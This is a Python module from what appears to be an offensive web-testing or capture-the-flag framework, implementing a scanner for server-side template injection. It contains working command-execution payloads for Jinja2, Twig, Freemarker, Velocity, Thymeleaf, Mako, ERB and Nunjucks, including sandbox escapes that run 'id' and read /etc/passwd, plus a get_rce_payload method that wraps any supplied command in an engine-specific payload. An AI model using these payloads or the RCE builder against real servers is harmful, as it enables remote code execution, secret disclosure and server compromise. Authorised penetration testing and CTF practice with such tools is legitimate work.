"""SSTI (Server-Side Template Injection) scanner module."""

import asyncio
import re
from typing import Optional, Callable

from ..base import AttackModule
from ...core.context import AttackContext
from ...core.http_client import Response
from ...utils.logger import log_info, log_warning, log_vulnerable, create_progress
from ...utils.flag_extractor import FlagExtractor


# Detection payloads - these cause arithmetic operations to test for SSTI
DETECTION_PAYLOADS = [
    # Math-based detection
    ("{{7*7}}", "49", "jinja2/twig"),
    ("${7*7}", "49", "freemarker/velocity"),
    ("<%= 7*7 %>", "49", "erb"),
    ("#{7*7}", "49", "ruby"),
    ("${{7*7}}", "49", "generic"),
    ("@(1+1)", "2", "razor"),
    ("{{7*'7'}}", "7777777", "jinja2"),  # String multiplication
    ("*{7*7}", "49", "thymeleaf"),
    ("{7*7}", "49", "smarty"),
    ("[[${7*7}]]", "49", "thymeleaf_inline"),
]

# Jinja2 (Python) payloads
JINJA2_PAYLOADS = [
    "{{config}}",
    "{{config.items()}}",
    "{{self.__class__.__mro__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
]

# Twig (PHP) payloads
TWIG_PAYLOADS = [
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{['id']|filter('system')}}",
    "{{['cat /etc/passwd']|filter('system')}}",
    "{{app.request.server.all|join(',')}}",
]

# Freemarker (Java) payloads
FREEMARKER_PAYLOADS = [
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    '${7*7}',
    '<#assign cmd = "freemarker.template.utility.Execute"?new()>${cmd("id")}',
]

# Velocity (Java) payloads
VELOCITY_PAYLOADS = [
    "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($ex=$rt.getRuntime().exec('id'))##",
    "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
]

# Thymeleaf (Java) payloads
THYMELEAF_PAYLOADS = [
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
]

# Mako (Python) payloads
MAKO_PAYLOADS = [
    "<%import os%>${os.popen('id').read()}",
    "<%import os; x=os.popen('id').read()%>${x}",
]

# ERB (Ruby) payloads
ERB_PAYLOADS = [
    "<%= 7*7 %>",
    "<%= system('id') %>",
    "<%= `id` %>",
    "<%= IO.popen('id').readlines() %>",
]

# Nunjucks (JavaScript) payloads
NUNJUCKS_PAYLOADS = [
    "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
    "{{constructor.constructor(\"return this.process.mainModule.require('child_process').execSync('id')\")()}}",
]

# Patterns indicating SSTI success
SSTI_SUCCESS_PATTERNS = [
    r'uid=\d+',  # id command output
    r'root:x:0:0',  # /etc/passwd
    r'<class ',  # Python class
    r'__class__',
    r'<Config ',  # Flask config
    r'SECRET_KEY',
    r'DEBUG',
]

# Template engine signatures
ENGINE_SIGNATURES = {
    "jinja2": ["jinja2", "__globals__", "config"],
    "twig": ["twig", "_self.env"],
    "freemarker": ["freemarker", "FreeMarker"],
    "velocity": ["Velocity", "VelocityEngine"],
    "thymeleaf": ["thymeleaf", "SpringTemplateEngine"],
    "mako": ["mako", "MakoException"],
    "erb": ["erb", "ERB"],
}


class SstiScanner(AttackModule):
    """SSTI vulnerability scanner."""

    @property
    def name(self) -> str:
        return "SSTI Scanner"

    @property
    def description(self) -> str:
        return "Scans for Server-Side Template Injection vulnerabilities"

    def __init__(self, ctx: AttackContext, engine: str = "auto"):
        """
        Initialize SSTI scanner.

        Args:
            ctx: Attack context
            engine: Target template engine (jinja2, twig, freemarker, etc. or auto)
        """
        super().__init__(ctx)
        self.engine = engine
        self.detected_engine: Optional[str] = None
        self.flag_extractor = FlagExtractor()
        self.vulnerable_payloads: list[dict] = []

    async def scan(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        detect_only: bool = False
    ) -> list[dict]:
        """
        Scan target for SSTI vulnerabilities.

        Args:
            payloads: Custom payloads (if None, uses built-in)
            on_finding: Callback function when vulnerability found
            detect_only: Only detect SSTI, don't attempt exploitation

        Returns:
            List of findings
        """
        # First, detect template engine
        await self._detect_engine()

        if payloads is None:
            payloads = self._get_default_payloads(detect_only)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} SSTI payloads against {self.ctx.target_url}")
            log_info(f"Target parameter: {self.ctx.inject_param}")
            if self.detected_engine:
                log_info(f"Detected template engine: {self.detected_engine}")

        # Setup baseline
        await self.setup()

        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for SSTI...", total=len(payloads))

            semaphore = asyncio.Semaphore(self.ctx.threads)

            async def test_with_semaphore(payload: str):
                async with semaphore:
                    return await self._test_single_payload(payload)

            tasks = [test_with_semaphore(p) for p in payloads]

            for coro in asyncio.as_completed(tasks):
                result = await coro
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

                    if self.ctx.verbose:
                        log_vulnerable(
                            self.ctx.target_url,
                            self.ctx.inject_param or "unknown",
                            result["payload"][:50] + "..."
                        )

        await self.cleanup()

        self.results = findings
        return findings

    def scan_sync(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        detect_only: bool = False
    ) -> list[dict]:
        """Synchronous scan."""
        # Detect engine
        self._detect_engine_sync()

        if payloads is None:
            payloads = self._get_default_payloads(detect_only)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} SSTI payloads")

        self.setup_sync()
        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for SSTI...", total=len(payloads))

            for payload in payloads:
                result = self._test_single_payload_sync(payload)
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

        self.cleanup_sync()
        self.results = findings
        return findings

    async def _detect_engine(self) -> None:
        """Detect template engine by testing detection payloads."""
        if self.engine != "auto":
            self.detected_engine = self.engine
            return

        for payload, expected, engine in DETECTION_PAYLOADS:
            try:
                response = await self.client.request_with_payload(payload)
                if expected in response.text:
                    self.detected_engine = engine.split("/")[0]  # Take first option
                    if self.ctx.verbose:
                        log_info(f"Template engine detected: {self.detected_engine}")
                    return
            except Exception:
                continue

    def _detect_engine_sync(self) -> None:
        """Synchronous engine detection."""
        if self.engine != "auto":
            self.detected_engine = self.engine
            return

        for payload, expected, engine in DETECTION_PAYLOADS:
            try:
                response = self.client.request_with_payload_sync(payload)
                if expected in response.text:
                    self.detected_engine = engine.split("/")[0]
                    if self.ctx.verbose:
                        log_info(f"Template engine detected: {self.detected_engine}")
                    return
            except Exception:
                continue

    async def _test_single_payload(self, payload: str) -> Optional[dict]:
        """Test a single SSTI payload asynchronously."""
        try:
            response = await self.client.request_with_payload(payload)

            # Check for flags
            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            # Check for SSTI indicators
            is_vulnerable, evidence, ssti_type = self._check_vulnerability(response, payload)

            if is_vulnerable:
                finding = {
                    "type": f"SSTI ({ssti_type})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(ssti_type, evidence),
                    "template_engine": self.detected_engine or "unknown",
                    "flags_found": flags,
                    "response_length": response.content_length,
                }
                self.vulnerable_payloads.append(finding)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing SSTI payload: {e}")

        return None

    def _test_single_payload_sync(self, payload: str) -> Optional[dict]:
        """Test a single payload synchronously."""
        try:
            response = self.client.request_with_payload_sync(payload)

            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            is_vulnerable, evidence, ssti_type = self._check_vulnerability(response, payload)

            if is_vulnerable:
                finding = {
                    "type": f"SSTI ({ssti_type})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(ssti_type, evidence),
                    "template_engine": self.detected_engine or "unknown",
                    "flags_found": flags,
                }
                self.vulnerable_payloads.append(finding)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing SSTI payload: {e}")

        return None

    def _check_vulnerability(
        self, response: Response, payload: str
    ) -> tuple[bool, str, str]:
        """Check if SSTI was successful."""
        text = response.text

        # Check for math operation results (detection payloads)
        for det_payload, expected, _ in DETECTION_PAYLOADS:
            if det_payload == payload and expected in text:
                return True, f"Math result '{expected}' in response", "detection"

        # Check for command execution patterns
        for pattern in SSTI_SUCCESS_PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return True, f"Pattern found: {match.group()[:50]}", "exploitation"

        # Check for template engine signatures
        for engine, signatures in ENGINE_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in text.lower():
                    # Only flag if this is a relevant payload
                    if engine in payload.lower() or self.detected_engine == engine:
                        return True, f"Engine signature '{sig}' in response", "information_disclosure"

        # Check for error-based detection
        error_patterns = [
            r'TemplateSyntaxError',
            r'TemplateError',
            r'Jinja2Exception',
            r'TemplateNotFound',
            r'FreeMarkerException',
        ]
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True, "Template error indicates SSTI", "error_based"

        return False, "", ""

    def _calculate_confidence(self, ssti_type: str, evidence: str) -> str:
        """Calculate confidence level."""
        if ssti_type == "exploitation" and ("uid=" in evidence or "root:" in evidence):
            return "high"
        if ssti_type == "detection" and any(num in evidence for num in ["49", "7777777"]):
            return "high"
        if ssti_type == "error_based":
            return "medium"
        return "low"

    def _get_default_payloads(self, detect_only: bool) -> list[str]:
        """Get default SSTI payloads."""
        payloads = [p[0] for p in DETECTION_PAYLOADS]

        if detect_only:
            return payloads

        # Add engine-specific payloads
        if self.detected_engine == "jinja2" or self.engine in ["auto", "jinja2"]:
            payloads.extend(JINJA2_PAYLOADS)

        if self.detected_engine == "twig" or self.engine in ["auto", "twig"]:
            payloads.extend(TWIG_PAYLOADS)

        if self.detected_engine == "freemarker" or self.engine in ["auto", "freemarker"]:
            payloads.extend(FREEMARKER_PAYLOADS)

        if self.detected_engine == "velocity" or self.engine in ["auto", "velocity"]:
            payloads.extend(VELOCITY_PAYLOADS)

        if self.detected_engine == "thymeleaf" or self.engine in ["auto", "thymeleaf"]:
            payloads.extend(THYMELEAF_PAYLOADS)

        if self.detected_engine == "mako" or self.engine in ["auto", "mako"]:
            payloads.extend(MAKO_PAYLOADS)

        if self.detected_engine == "erb" or self.engine in ["auto", "erb"]:
            payloads.extend(ERB_PAYLOADS)

        if self.detected_engine == "nunjucks" or self.engine in ["auto", "nunjucks"]:
            payloads.extend(NUNJUCKS_PAYLOADS)

        return list(set(payloads))

    def get_rce_payload(self, command: str) -> Optional[str]:
        """Get RCE payload for detected engine."""
        if self.detected_engine == "jinja2":
            return f"{{{{cycler.__init__.__globals__.os.popen('{command}').read()}}}}"
        elif self.detected_engine == "twig":
            return f"{{{{['{command}']|filter('system')}}}}"
        elif self.detected_engine == "freemarker":
            return f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{command}")}}'
        elif self.detected_engine == "erb":
            return f"<%= `{command}` %>"
        elif self.detected_engine == "mako":
            return f"<%import os%>${{os.popen('{command}').read()}}"

        return None
